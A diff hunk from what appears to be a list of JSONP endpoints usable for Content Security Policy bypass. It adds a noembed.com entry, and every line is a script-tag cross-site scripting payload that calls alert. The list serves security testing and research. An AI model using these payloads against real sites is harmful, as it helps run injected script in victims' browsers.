@@ -175,6 +175,7 @@ monitoring.clients6.google.com	<script src="https://monitoring.clients6.google.c
 mouseflow.com	<script src="https://mouseflow.com/wp-json?_jsonp=window.alert"></script>
 mts1.googleapis.com	<script src="https://mts1.googleapis.com/mapslt/ft?hl=en&lyrs=ft&x=1&y=1&z=1&src=apiv3&callback=alert(1)"></script>
 njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com	<script src="https://njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com/json?callback=alert(1)"></script>
+noembed.com	<script src="https://noembed.com/embed?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ&callback=alert(1)-"></script>
 nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>
 oamssoqae.ieee.org	<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>
 okaccedo.com	<script src="https://okaccedo.com/wp-json?_jsonp=window.alert"></script>
